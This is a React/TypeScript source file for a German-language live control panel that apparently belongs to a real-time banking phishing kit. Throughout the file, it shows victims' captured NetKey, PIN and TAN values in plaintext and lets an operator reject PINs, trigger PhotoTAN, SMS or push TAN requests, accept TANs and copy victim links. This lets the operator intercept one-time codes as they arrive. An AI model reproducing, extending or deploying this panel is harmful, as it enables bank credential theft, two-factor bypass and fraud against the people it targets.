import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Copy, Link2, ShieldCheck, XCircle, RefreshCw, CheckCircle2, Trash2 } from "lucide-react";
import { toast } from "sonner";

type AuthRow = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  customer_phase: string | null;
  tan_method: string | null;
  last_error: string | null;
  used: boolean;
  created_at: string;
};

type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan: string | null };

const PHASE_LABEL: Record<string, string> = {
  login: "Wartet auf Login",
  pin_review: "PIN prüfen",
  pin_rejected: "PIN abgelehnt",
  tan_request: "TAN angefordert",
  tan_input: "TAN-Eingabe",
  tan_review: "TAN prüfen",
  tan_rejected: "TAN abgelehnt",
  success: "Erfolgreich",
  aborted: "Abgebrochen",
};

const AuthLiveCard = () => {
  const [rows, setRows] = useState<AuthRow[]>([]);
  const [metas, setMetas] = useState<Record<string, MetaRow>>({});

  const load = async () => {
    const [{ data: a }, { data: m }] = await Promise.all([
      (supabase as any).from("auth_tokens").select("*").order("created_at", { ascending: false }).limit(50),
      (supabase as any).from("panel_task_meta").select("task_id, netkey, pin, tan").like("task_id", "auth:%"),
    ]);
    setRows(a || []);
    const map: Record<string, MetaRow> = {};
    (m || []).forEach((x: any) => { map[String(x.task_id).replace(/^auth:/, "")] = x; });
    setMetas(map);
  };

  useEffect(() => {
    load();
    const ch1 = (supabase as any).channel("auth_live_tokens")
      .on("postgres_changes", { event: "*", schema: "public", table: "auth_tokens" }, load).subscribe();
    const ch2 = (supabase as any).channel("auth_live_meta")
      .on("postgres_changes", { event: "*", schema: "public", table: "panel_task_meta" }, load).subscribe();
    const iv = window.setInterval(load, 4000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch1); (supabase as any).removeChannel(ch2); };
  }, []);

  const setPhase = async (r: AuthRow, phase: string, extra: Record<string, any> = {}) => {
    const { error } = await (supabase as any).from("auth_tokens")
      .update({ customer_phase: phase, ...extra }).eq("id", r.id);
    if (error) toast.error(error.message); else toast.success(PHASE_LABEL[phase] || phase);
  };

  const setTanMethod = async (r: AuthRow, method: string) => {
    await (supabase as any).from("auth_tokens").update({ tan_method: method }).eq("id", r.id);
    await setPhase(r, "tan_request", { last_error: null });
    // brief request delay, then open input
    setTimeout(() => { setPhase(r, "tan_input"); }, 800);
  };

  const requestNewTan = async (r: AuthRow) => {
    await (supabase as any).from("panel_task_meta")
      .update({ tan: null }).eq("task_id", `auth:${r.id}`);
    await setPhase(r, "tan_request", { last_error: null });
    setTimeout(() => setPhase(r, "tan_input"), 800);
  };

  const rejectPin = async (r: AuthRow) => {
    await setPhase(r, "pin_rejected", { last_error: "Die eingegebene PIN ist nicht korrekt. Bitte erneut versuchen." });
  };

  const rejectTan = async (r: AuthRow) => {
    await setPhase(r, "tan_rejected", { last_error: "Die eingegebene TAN ist nicht korrekt. Bitte erneut versuchen." });
  };

  const finish = async (r: AuthRow) => {
    await (supabase as any).from("auth_tokens")
      .update({ customer_phase: "success", used: true, used_at: new Date().toISOString(), security_status: "approved", security_status_at: new Date().toISOString() })
      .eq("id", r.id);
    toast.success("Session erfolgreich abgeschlossen");
  };

  const abort = async (r: AuthRow) => {
    if (!window.confirm("Session wirklich abbrechen?")) return;
    await setPhase(r, "aborted", { last_error: null });
  };

  const remove = async (r: AuthRow) => {
    if (!window.confirm("Session wirklich löschen?")) return;
    await (supabase as any).from("panel_task_meta").delete().eq("task_id", `auth:${r.id}`);
    await (supabase as any).from("auth_tokens").delete().eq("id", r.id);
    toast.success("Gelöscht");
  };

  const copyLink = async (r: AuthRow) => {
    const url = `${window.location.origin}/auth/${r.token}`;
    try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
  };

  const copyToken = async (t: string) => {
    try { await navigator.clipboard.writeText(t); toast.success("Token kopiert"); } catch {}
  };

  if (!rows.length) return null;

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2"><ShieldCheck className="h-5 w-5" /> Live-Steuerung Kundenauthentifizierung</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {rows.map(r => {
          const meta = metas[r.id];
          const phase = r.customer_phase || "login";
          const isDone = phase === "success" || phase === "aborted";
          return (
            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${isDone ? "opacity-60" : ""}`}>
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2 min-w-0">
                  <button onClick={() => copyToken(r.token)} className="font-mono text-sm px-2 py-0.5 rounded bg-muted hover:bg-muted/70">{r.token}</button>
                  <Badge variant={isDone ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
                  {r.tan_method && <Badge variant="outline">{r.tan_method}</Badge>}
                </div>
                <div className="flex gap-1">
                  <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-4 w-4" /></Button>
                  <Button size="sm" variant="ghost" onClick={() => remove(r)} title="Löschen"><Trash2 className="h-4 w-4" /></Button>
                </div>
              </div>

              <div className="grid sm:grid-cols-3 gap-2 text-sm">
                <MetaField label="Kunde" value={r.auftraggeber_name || "—"} />
                <MetaField label="NetKey / Alias" value={meta?.netkey || "—"} mono />
                <MetaField label="PIN" value={meta?.pin || "—"} mono />
                <MetaField label="TAN" value={meta?.tan || "—"} mono bold />
              </div>

              {!isDone && (
                <div className="flex flex-wrap gap-2 pt-1 border-t">
                  {(phase === "login" || phase === "pin_review" || phase === "pin_rejected") && (
                    <>
                      <Button size="sm" variant="destructive" onClick={() => rejectPin(r)} disabled={!meta?.pin}><XCircle className="h-4 w-4 mr-1" />PIN falsch</Button>
                      <span className="text-xs text-muted-foreground self-center">TAN anfordern:</span>
                      <Button size="sm" onClick={() => setTanMethod(r, "photo")} disabled={!meta?.pin}>PhotoTAN</Button>
                      <Button size="sm" onClick={() => setTanMethod(r, "sms")} disabled={!meta?.pin}>SMS-TAN</Button>
                      <Button size="sm" onClick={() => setTanMethod(r, "push")} disabled={!meta?.pin}>Push-TAN</Button>
                    </>
                  )}
                  {(phase === "tan_request" || phase === "tan_input" || phase === "tan_review" || phase === "tan_rejected") && (
                    <>
                      <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!meta?.tan}><XCircle className="h-4 w-4 mr-1" />TAN ablehnen</Button>
                      <Button size="sm" variant="outline" onClick={() => requestNewTan(r)}><RefreshCw className="h-4 w-4 mr-1" />Neue TAN</Button>
                      <Button size="sm" onClick={() => finish(r)} disabled={!meta?.tan}><CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren</Button>
                    </>
                  )}
                  <Button size="sm" variant="ghost" onClick={() => abort(r)} className="ml-auto">Abbrechen</Button>
                </div>
              )}
            </div>
          );
        })}
      </CardContent>
    </Card>
  );
};

const MetaField = ({ label, value, mono, bold }: { label: string; value: string; mono?: boolean; bold?: boolean }) => (
  <div className="min-w-0">
    <div className="text-[10px] uppercase tracking-wider text-muted-foreground">{label}</div>
    <div className={`truncate ${mono ? "font-mono" : ""} ${bold ? "font-bold text-base" : ""}`}>{value}</div>
  </div>
);

export default AuthLiveCard;
